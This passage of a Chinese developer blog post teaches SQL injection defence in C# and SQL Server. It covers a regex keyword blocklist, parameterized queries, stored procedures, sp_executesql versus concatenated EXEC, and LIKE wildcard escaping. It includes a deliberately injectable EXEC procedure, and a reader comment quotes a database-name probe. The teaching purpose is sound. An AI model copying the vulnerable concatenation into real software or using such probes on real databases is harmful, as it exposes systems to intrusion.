+<p><code class="highlighter-rouge">Regex regex4 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"drop "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);  </code></p>
+
+<p><code class="highlighter-rouge">Regex regex5 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"\""</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex6 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"exec "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex7 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"xp_"</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex8 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"insert "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex9 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"delete "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex10 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"select "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex11 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"update "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">(regex.IsMatch(parms) || (regex2.IsMatch(parms) || (regex3.IsMatch(parms) || (regex4.IsMatch(parms) || (regex5.IsMatch(parms) || (regex6.IsMatch(parms) || (regex7.IsMatch(parms) || (regex8.IsMatch(parms) || (regex9.IsMatch(parms) || (regex10.IsMatch(parms) || (regex11.IsMatch(parms))))))))))));</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>优点：写法相对简单，网络传输量相对参数化拼接SQL小</p>
+
+<p>缺点：</p>
+
+<p>a) 对于关键字过滤，常常“顾此失彼”，如漏掉关键字，系统函数，对于HEX编码的SQL语句没办法识别等等，并且需要针对各个数据库封装函数。</p>
+
+<p>b) 无法满足需求：用户本来就想发表包含这些过滤字符的数据。</p>
+
+<p>c) 执行拼接的SQL浪费大量缓存空间来存储只用一次的查询计划。服务器的物理内存有限，SQLServer的缓存空间也有限。有限的空间应该被充分利用。</p>
+
+<p>2) 参数化查询（Parameterized Query）</p>
+
+<p>a) 检查客户端脚本，类型检查，长度验证，使用枚举，明确的关键字过滤这些操作也是需要的。他们能尽早检查出数据的有效性。</p>
+
+<p>b) 参数化查询原理：在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL指令的一部份来处理，而是在数据库完成 SQL 指令的编译后，才套用参数运行，因此就算参数中含有具有损的指令，也不会被数据库所运行。</p>
+
+<p>c) 所以在实际开发中，入口处的安全检查是必要的，参数化查询应作为最后一道安全防线。</p>
+
+<p>优点：</p>
+
+<p>Ø 防止SQL注入(使单引号、分号、注释符、xp_扩展函数、拼接SQL语句、EXEC、SELECT、UPDATE、DELETE等SQL指令无效化)</p>
+
+<p>Ø 参数化查询能强制执行类型和长度检查。</p>
+
+<p>Ø 在MSSQL中生成并重用查询计划，从而提高查询效率（执行一条SQL语句，其生成查询计划将消耗大于50%的时间）</p>
+
+<p>缺点：</p>
+
+<p>Ø 不是所有数据库都支持参数化查询。目前Access、SQL Server、MySQL、SQLite、Oracle等常用数据库支持参数化查询。</p>
+
+<p>疑问：参数化如何“批量更新”数据库。</p>
+
+<p>a) 通过在参数名上增加一个计数来区分开多个参数化语句拼接中的同名参数。</p>
+
+<p>EG：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p><code class="highlighter-rouge">StringBuilder sqlBuilder=</code><code class="highlighter-rouge">new</code> <code class="highlighter-rouge">StringBuilder(512);</code></p>
+
+<p><code class="highlighter-rouge">Int count=0;</code></p>
+
+<p><code class="highlighter-rouge">For(循环)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">sqlBuilder.AppendFormat(“UPDATE login SET password=@password{0} WHERE username=@userName{0}”,count.ToString());</code></p>
+
+<p><code class="highlighter-rouge">SqlParameter para=</code><code class="highlighter-rouge">new</code> <code class="highlighter-rouge">SqlParamter(){ParameterName=@password+count.ToString()}</code></p>
+
+<p><code class="highlighter-rouge">……</code></p>
+
+<p><code class="highlighter-rouge">Count++;</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>b) 通过MSSQL 2008的新特性：表值参数，将C#中的整个表当参数传递给存储过程，由SQL做逻辑处理。注意C#中参数设置parameter.SqlDbType = System.Data.SqlDbType.Structured;  <a href="http://www.codeproject.com/Articles/39161/C-and-Table-Value-Parameters">详细请查看……</a></p>
+
+<p>疑虑：有部份的开发人员可能会认为使用参数化查询，会让程序更不好维护，或者在实现部份功能上会非常不便，然而，使用参数化查询造成的额外开发成本，通常都远低于因为SQL注入攻击漏洞被发现而遭受攻击，所造成的重大损失。</p>
+
+<p>另外：想验证重用查询计划的同学，可以使用下面两段辅助语法</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p><code class="highlighter-rouge">--清空缓存的查询计划</code></p>
+
+<p><code class="highlighter-rouge">DBCC FREEPROCCACHE</code></p>
+
+<p><code class="highlighter-rouge">GO</code></p>
+
+<p><code class="highlighter-rouge">--查询缓存的查询计划</code></p>
+
+<p><code class="highlighter-rouge">SELECT</code> <code class="highlighter-rouge">stats.execution_count</code> <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">cnt, p.size_in_bytes</code> <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">[</code><code class="highlighter-rouge">size</code><code class="highlighter-rouge">], [sql].[text]</code> <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">[plan_text] </code></p>
+
+<p><code class="highlighter-rouge">FROM</code> <code class="highlighter-rouge">sys.dm_exec_cached_plans p</code></p>
+
+<p><code class="highlighter-rouge">OUTER</code> <code class="highlighter-rouge">APPLY sys.dm_exec_sql_text (p.plan_handle) sql</code></p>
+
+<p><code class="highlighter-rouge">JOIN</code> <code class="highlighter-rouge">sys.dm_exec_query_stats stats</code> <code class="highlighter-rouge">ON</code> <code class="highlighter-rouge">stats.plan_handle = p.plan_handle</code></p>
+
+<p><code class="highlighter-rouge">GO</code></p>
+
+<p>3) 参数化查询示例</p>
+
+<p>效果如图：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922251795.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922275184.png" alt="image" title="image" /></a></p>
+
+<p>参数化关键代码：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p><code class="highlighter-rouge">Private</code> <code class="highlighter-rouge">bool</code> <code class="highlighter-rouge">ProtectLogin(</code><code class="highlighter-rouge">string</code> <code class="highlighter-rouge">userName,</code> <code class="highlighter-rouge">string</code> <code class="highlighter-rouge">password)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">SqlParameter[] parameters =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">SqlParameter[]</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">new</code> <code class="highlighter-rouge">SqlParameter{ParameterName=</code><code class="highlighter-rouge">"@UserName"</code><code class="highlighter-rouge">,SqlDbType=SqlDbType.NVarChar,Size=10,Value=userName},</code></p>
+
+<p><code class="highlighter-rouge">new</code> <code class="highlighter-rouge">SqlParameter{ParameterName=</code><code class="highlighter-rouge">"@Password"</code><code class="highlighter-rouge">,SqlDbType=SqlDbType.VarChar,Size=20,Value=password}</code></p>
+
+<p><code class="highlighter-rouge">};</code></p>
+
+<p><code class="highlighter-rouge">int</code> <code class="highlighter-rouge">count = (</code><code class="highlighter-rouge">int</code><code class="highlighter-rouge">)SqlHelper.Instance.ExecuteScalar</code></p>
+
+<p><code class="highlighter-rouge">(</code><code class="highlighter-rouge">"SELECT COUNT(*) FROM Login WHERE UserName=@UserName AND Password=@password"</code><code class="highlighter-rouge">, parameters);</code></p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">count &gt; 0 ?</code> <code class="highlighter-rouge">true</code> <code class="highlighter-rouge">:</code> <code class="highlighter-rouge">false</code><code class="highlighter-rouge">;</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<ol>
+  <li>存储过程</li>
+</ol>
+
+<p>存储过程（Stored Procedure）是在大型数据库系统中，一组为了完成特定功能的SQL 语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p>
+
+<p>优点：</p>
+
+<p>a) 安全性高，防止SQL注入并且可设定只有某些用户才能使用指定存储过程。</p>
+
+<p>b) 在创建时进行预编译，后续的调用不需再重新编译。</p>
+
+<p>c) 可以降低网络的通信量。存储过程方案中用传递存储过程名来代替SQL语句。</p>
+
+<p>缺点：</p>
+
+<p>a) 非应用程序内联代码，调式麻烦。</p>
+
+<p>b) 修改麻烦，因为要不断的切换开发工具。（不过也有好的一面，一些易变动的规则做到存储过程中，如变动就不需要重新编译应用程序）</p>
+
+<p>c) 如果在一个程序系统中大量的使用存储过程，到程序交付使用的时候随着用户需求的增加会导致数据结构的变化，接着就是系统的相关问题了，最后如果用户想维护该系统可以说是很难很难（eg：没有VS的查询功能）。</p>
+
+<p>演示请下载示例程序，关键代码为：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p><code class="highlighter-rouge">cmd.CommandText = procName;</code> <code class="highlighter-rouge">// 传递存储过程名</code></p>
+
+<p><code class="highlighter-rouge">cmd.CommandType = CommandType.StoredProcedure;</code> <code class="highlighter-rouge">// 标识解析为存储过程</code></p>
+
+<p>如果在存储过程中SQL语法很复杂需要根据逻辑进行拼接，这时是否还具有放注入的功能？</p>
+
+<p>答：MSSQL中可以通过 EXEC 和sp_executesql动态执行拼接的sql语句，但sp_executesql支持替换 Transact-SQL 字符串中指定的任何参数值， EXECUTE 语句不支持。所以只有使用sp_executesql方式才能启到参数化防止SQL注入。</p>
+
+<p>关键代码：（详细见示例）</p>
+
+<p>a) sp_executesql</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p><code class="highlighter-rouge">CREATE</code> <code class="highlighter-rouge">PROCEDURE</code> <code class="highlighter-rouge">PROC_Login_executesql(</code></p>
+
+<p><code class="highlighter-rouge">@userNamenvarchar(10),</code></p>
+
+<p><code class="highlighter-rouge">@</code><code class="highlighter-rouge">password</code> <code class="highlighter-rouge">nvarchar(10),</code></p>
+
+<p><code class="highlighter-rouge">@</code><code class="highlighter-rouge">count</code> <code class="highlighter-rouge">int</code> <code class="highlighter-rouge">OUTPUT</code></p>
+
+<p><code class="highlighter-rouge">)</code></p>
+
+<p><code class="highlighter-rouge">AS</code></p>
+
+<p><code class="highlighter-rouge">BEGIN</code></p>
+
+<p><code class="highlighter-rouge">DECLARE</code> <code class="highlighter-rouge">@s nvarchar(1000);</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@s=N</code><code class="highlighter-rouge">'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password'</code><code class="highlighter-rouge">;</code></p>
+
+<p><code class="highlighter-rouge">EXEC</code> <code class="highlighter-rouge">sp_executesql @s,N</code><code class="highlighter-rouge">'@userName nvarchar(10),@password nvarchar(10),@count int output'</code><code class="highlighter-rouge">,@userName=@userName,@</code><code class="highlighter-rouge">password</code><code class="highlighter-rouge">=@</code><code class="highlighter-rouge">password</code><code class="highlighter-rouge">,@</code><code class="highlighter-rouge">count</code><code class="highlighter-rouge">=@</code><code class="highlighter-rouge">count</code> <code class="highlighter-rouge">output</code></p>
+
+<p><code class="highlighter-rouge">END</code></p>
+
+<p>b) EXECUTE（注意sql中拼接字符，对于字符参数需要额外包一层单引号，需要输入两个单引号来标识sql中的一个单引号）</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p><code class="highlighter-rouge">CREATE</code> <code class="highlighter-rouge">PROCEDURE</code> <code class="highlighter-rouge">PROC_Login_EXEC(</code></p>
+
+<p><code class="highlighter-rouge">@userNamenvarchar(10),</code></p>
+
+<p><code class="highlighter-rouge">@</code><code class="highlighter-rouge">password</code> <code class="highlighter-rouge">varchar</code><code class="highlighter-rouge">(20)</code></p>
+
+<p><code class="highlighter-rouge">)</code></p>
+
+<p><code class="highlighter-rouge">AS</code></p>
+
+<p><code class="highlighter-rouge">BEGIN</code></p>
+
+<p><code class="highlighter-rouge">DECLARE</code> <code class="highlighter-rouge">@s nvarchar(1000);</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@s=</code><code class="highlighter-rouge">'SELECT @count=COUNT(*) FROM Login WHERE UserName='</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">+</code><code class="highlighter-rouge">CAST</code><code class="highlighter-rouge">(@userName</code> <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">NVARCHAR(10))+</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">' AND Password='</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">+</code><code class="highlighter-rouge">CAST</code><code class="highlighter-rouge">(@</code><code class="highlighter-rouge">password</code> <code class="highlighter-rouge">AS</code> <code class="highlighter-rouge">VARCHAR</code><code class="highlighter-rouge">(20))+</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">;</code></p>
+
+<p><code class="highlighter-rouge">EXEC</code><code class="highlighter-rouge">(</code><code class="highlighter-rouge">'DECLARE @count int;'</code> <code class="highlighter-rouge">+@s+</code><code class="highlighter-rouge">'select @count'</code><code class="highlighter-rouge">);</code></p>
+
+<p><code class="highlighter-rouge">END</code></p>
+
+<p>注入截图如下：</p>
+
+<p>      <a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922292478.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922302346.png" alt="image" title="image" /></a></p>
+
+<ol>
+  <li>专业的SQL注入工具及防毒软件</li>
+</ol>
+
+<p>情景1</p>
+
+<p>A：“丫的，又中毒了……”</p>
+
+<p>B：“我看看，你这不是裸机在跑吗？”</p>
+
+<p>电脑上至少也要装一款杀毒软件或木马扫描软件，这样可以避免一些常见的侵入。比如开篇提到的SQL创建windows帐户，就会立马报出警报。</p>
+
+<p>情景2</p>
+
+<p>A：“终于把网站做好了，太完美了，已经检查过没有漏洞了！”</p>
+
+<p>A：“网站怎么被黑了，怎么入侵的？？？”</p>
+
+<p>公司或个人有财力的话还是有必要购买一款专业SQL注入工具来验证下自己的网站，这些工具毕竟是专业的安全人员研发，在安全领域都有自己的独到之处。SQL注入工具介绍：<a href="http://blog.jobbole.com/17763/">10个SQL注入工具</a></p>
+
+<ol>
+  <li>额外小知识：LIKE中的通配符</li>
+</ol>
+
+<p>尽管这个不属于SQL注入，但是其被恶意使用的方式是和SQL注入类似的。</p>
+
+<p>参考：<a href="http://losegoat.blog.163.com/blog/static/1822557200852111915785/">SQL中通配符的使用</a></p>
+
+<p>%</p>
+
+<p>包含零个或多个字符的任意字符串。</p>
+
+<p>_</p>
+
+<p>任何单个字符。</p>
+
+<p>[]</p>
+
+<p>指定范围（例如 [a-f]）或集合（例如 [abcdef]）内的任何单个字符。</p>
+
+<p>[^]</p>
+
+<p>不在指定范围（例如 [^a - f]）或集合（例如 [^abcdef]）内的任何单个字符。</p>
+
+<p>在模糊查询LIKE中，对于输入数据中的通配符必须转义，否则会造成客户想查询包含这些特殊字符的数据时，这些特殊字符却被解析为通配符。不与 LIKE 一同使用的通配符将解释为常量而非模式。</p>
+
+<p><strong>注意使用通配符的索引性能问题：</strong></p>
+
+<p>a) like的第一个字符是’%’或’_‘时，为未知字符不会使用索引, sql会遍历全表。</p>
+
+<p>b) 若通配符放在已知字符后面，会使用索引。</p>
+
+<p>网上有这样的说法，不过我在MSSQL中使用 ctrl+L 执行语法查看索引使用情况却都没有使用索引，可能在别的数据库中会使用到索引吧……</p>
+
+<p>截图如下：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922313294.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922338669.png" alt="image" title="image" /></a></p>
+
+<p>有两种将通配符转义为普通字符的方法：</p>
+
+<p>1) 使用ESCAPE关键字定义转义符（通用）</p>
+
+<p>在模式中，当转义符置于通配符之前时，该通配符就解释为普通字符。例如，要搜索在任意位置包含字符串 5% 的字符串，请使用：</p>
+
+<p>WHERE ColumnA LIKE ‘%5/%%’ ESCAPE ‘/’</p>
+
+<p>2) 在方括号 ([ ]) 中只包含通配符本身，或要搜索破折号 (-) 而不是用它指定搜索范围，请将破折号指定为方括号内的第一个字符。EG：</p>
+
+<p>符号</p>
+
+<p>含义</p>
+
+<p>LIKE ‘5[%]’</p>
+
+<p>5%</p>
+
+<p>LIKE ‘5%’</p>
+
+<p>5 后跟 0 个或多个字符的字符串</p>
+
+<p>LIKE ‘[_]n’</p>
+
+<p>_n</p>
+
+<p>LIKE ‘_n’</p>
+
+<p>an, in, on (and so on)</p>
+
+<p>LIKE ‘[a-cdf]’</p>
+
+<p>a、b、c、d 或 f</p>
+
+<p>LIKE ‘[-acdf]’</p>
+
+<p>-、a、c、d 或 f</p>
+
+<p>LIKE ‘[ [ ]’</p>
+
+<p>[</p>
+
+<p>LIKE ‘]’</p>
+
+<p>] （右括号不需要转义）</p>
+
+<p>所以，进行过输入参数的关键字过滤后，还需要做下面转换确保LIKE的正确执行</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p><code class="highlighter-rouge">private</code> <code class="highlighter-rouge">static</code> <code class="highlighter-rouge">string</code> <code class="highlighter-rouge">ConvertSqlForLike(</code><code class="highlighter-rouge">string</code> <code class="highlighter-rouge">sql)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">sql = sql.Replace(</code><code class="highlighter-rouge">"["</code><code class="highlighter-rouge">,</code> <code class="highlighter-rouge">"[[]"</code><code class="highlighter-rouge">);</code> <code class="highlighter-rouge">// 这句话一定要在下面两个语句之前，否则作为转义符的方括号会被当作数据被再次处理</code></p>
+
+<p><code class="highlighter-rouge">sql = sql.Replace(</code><code class="highlighter-rouge">"_"</code><code class="highlighter-rouge">,</code> <code class="highlighter-rouge">"[_]"</code><code class="highlighter-rouge">);</code></p>
+
+<p><code class="highlighter-rouge">sql = sql.Replace(</code><code class="highlighter-rouge">"%"</code><code class="highlighter-rouge">,</code> <code class="highlighter-rouge">"[%]"</code><code class="highlighter-rouge">);</code></p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">sql;</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>结束语：感谢你耐心的观看。恭喜你， SQL安全攻防你已经入门了……</p>
+
+<p>参考文献：</p>
+
+<p> <a href="http://wenku.baidu.com/view/dc6b95660b1c59eef8c7b449.html">SQL注入天书</a></p>
+
+<p><a href="http://baike.baidu.com/view/3896.htm">(百度百科)SQL注入</a></p>
+
+<p>扩展资料：</p>
+
+<p>        <a href="http://blog.csdn.net/babauyang/article/details/7714211">Sql Server 编译、重编译与执行计划重用原理</a></p>
+
+<p><a href="http://www.cnblogs.com/lzrabbit/archive/2012/04/21/2460978.html">浅析Sql Server参数化查询</a>-----验证了参数的类型和长度对参数化查询影响</p>
+
+<p><a href="http://wenku.baidu.com/view/9f19df7701f69e3143329421.html">Sql Server参数化查询之<strong>where in</strong>和like实现详解</a></p>
+
+<p>-----讲述6种参数化实现方案</p>
+
+<p> <a href="http://baike.baidu.com/view/53110.htm">webshell</a>  -----不当小白，你必须认识的专业术语。一个用于站长管理，入侵者入侵的好工具</p>
+
+<p><a href="http://www.searchsecurity.com.cn/showcontent_2544.htm">SQL注入技术和跨站脚本攻击的检测</a> -----讲解使用正则表达式检测注入</p>
+
+<p>            <a href="http://baike.baidu.com/view/50325.htm">XSS(百度百科)</a>              ——-恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
+
+<p>            <a href="http://news.cnblogs.com/n/106793/">XSS攻击实例</a>                ——-基本思路：我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。</p>
+
+<p>         <a href="http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html">Web安全测试之XSS</a></p>
+
+<p>            <a href="http://www.cnblogs.com/developersupport/p/WebAPI-Security.html">Web API 入门指南 - 闲话安全 </a></p>
+
+<p>            <a href="http://www.cnblogs.com/LittleHann/p/3735602.html">中间人攻击(MITM)姿势总结</a></p>
+
+<p>            <a href="http://www.cnblogs.com/vajoy/p/4176908.html">浅谈WEB安全性（前端向）</a></p>
+
+<p>作者：<a href="http://www.cnblogs.com/heyuquan/">滴答的雨</a><br />
+出处：<a href="http://www.cnblogs.com/heyuquan/">http://www.cnblogs.com/heyuquan/</a><br />
+本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。</p>
+
+<p>欢迎园友讨论下自己的见解，及向我推荐更好的资料。<br />
+本文如对您有帮助，还请多帮 <strong>【推荐】</strong> 下此文。<br />
+谢谢！！！  (<em>^_^</em>)<br />
+技术群：185718116（广深莞·NET技术），欢迎你的加入<br />
+技术群：<a href="http://shang.qq.com/wpa/qunwpa?idkey=bedc1077396d17ebbb84f29e7704a63fb3da35c3b6902e537e6cf2283ccbb6d3"><img src="http://pub.idqqimg.com/wpa/images/group.png" alt="广西IT技术交流" title="广西IT技术交流" /></a>（广西IT技术交流），欢迎你的加入</p>
+
+<p><a href="javascript:void(0);">好文要顶</a> <a href="javascript:void(0);">关注我</a> <a href="javascript:void(0);">收藏该文</a> <a href="javascript:void(0);" title="分享至新浪微博"><img src="https://common.cnblogs.com/images/icon_weibo_24.png" alt="" /></a> <a href="javascript:void(0);" title="分享至微信"><img src="https://common.cnblogs.com/images/wechat.png" alt="" /></a></p>
+
+<p><a href="https://home.cnblogs.com/u/heyuquan/"><img src="https://pic.cnblogs.com/face/u106337.jpg?id=13140010" alt="" /></a></p>
+
+<p><a href="https://home.cnblogs.com/u/heyuquan/">滴答的雨</a><br />
+<a href="https://home.cnblogs.com/u/heyuquan/followees/">关注 - 78</a><br />
+<a href="https://home.cnblogs.com/u/heyuquan/followers/">粉丝 - 2323</a></p>
+
+<p>推荐博客</p>
+
+<p><a href="javascript:void(0);">+加关注</a></p>
+
+<p><a href="javascript:void(0);">关注 【滴答的雨】</a></p>
+
+<p>257</p>
+
+<p>1</p>
+
+<p><a href="javascript:void(0);">快速评论</a>     <a href="#top">返回顶部</a></p>
+
+<p>currentDiggType = 0;</p>
+
+<p><a href="https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html">«</a> 上一篇： <a href="https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html" title="发布于 2012-09-28 18:52">博客美化：通用代码高亮插件（SyntaxHighlighter）</a><br />
+<a href="https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html">»</a> 下一篇： <a href="https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html" title="发布于 2012-11-30 11:04">（译）关于async与await的FAQ</a></p>
+
+<p>posted on 2012-10-31 19:38 <a href="https://www.cnblogs.com/heyuquan/">滴答的雨</a> 阅读(140430) 评论(212) <a href="https://i.cnblogs.com/EditPosts.aspx?postid=2748577">编辑</a> <a href="javascript:void(0)">收藏</a></p>
+
+<p>markdown_highlight(); var allowComments = true, cb_blogId = 113108, cb_blogApp = ‘heyuquan’, cb_blogUserGuid = ‘7c8a509c-abf3-de11-ba8f-001cf0cd104b’; var cb_entryId = 2748577, cb_entryCreatedDate = ‘2012-10-31 19:38’, cb_postType = 1; loadViewCount(cb_entryId);</p>
+
+<p><a href="#!comments">&lt; Prev</a> <a href="#!comments">1</a> <a href="#!comments">2</a> <a href="#!comments">3</a> <a href="#!comments">4</a> 5</p>
+
+<p><strong>评论:</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3347124">#201楼</a> 2016-01-13 18:01</td>
+      <td><a href="https://www.cnblogs.com/venice/">venices</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>不错，值得学习</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3366427">#202楼</a> 2016-02-25 09:02</td>
+      <td><a href="https://home.cnblogs.com/u/897726/">RyanLe</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>楼主，你好，才开始涉及安全，请问下您这里有没有注入工具可供下载。</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3415676">#203楼</a> 2016-04-22 21:19</td>
+      <td><a href="https://www.cnblogs.com/ITLearner-Linda/">心云linda</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>请问这里<br />
+a) 猜测数据库名： and db_name() &gt;0 或系统表master.dbo.sysdatabases<br />
+是怎么用master.dbo.sysdatabases猜数据库名的？</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3470311">#204楼</a> 2016-07-14 20:38</td>
+      <td><a href="https://home.cnblogs.com/u/992638/">ppassion</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>博主大大你好，源码中是不包含数据库的吗，好像程序不能运行</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>  </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3499002">#205楼</a> 2016-08-29 17:58</td>
+      <td><a href="https://www.cnblogs.com/zzry/">一百零七个</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>mark!</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>https://pic.cnblogs.com/face/983981/20160629093639.png   </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3527913">#206楼</a> 2016-10-11 10:35</td>
+      <td><a href="https://www.cnblogs.com/webster1/">吴某1</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png" alt="" /></p>
+
+<p>666</p>
+
+<p><a href="javascript:void(0);">支持(0)</a> <a href="javascript:void(0);">反对(0)</a></p>
+
+<p>https://pic.cnblogs.com/face/723162/20150212174325.png   </p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><a href="#3535869">#207楼</a> 2016-10-19 14:45</td>
+      <td><a href="https://home.cnblogs.com/u/896034/">浮生若梦丶丨</a></td>
+    </tr>
+  </tbody>
+</table>
+
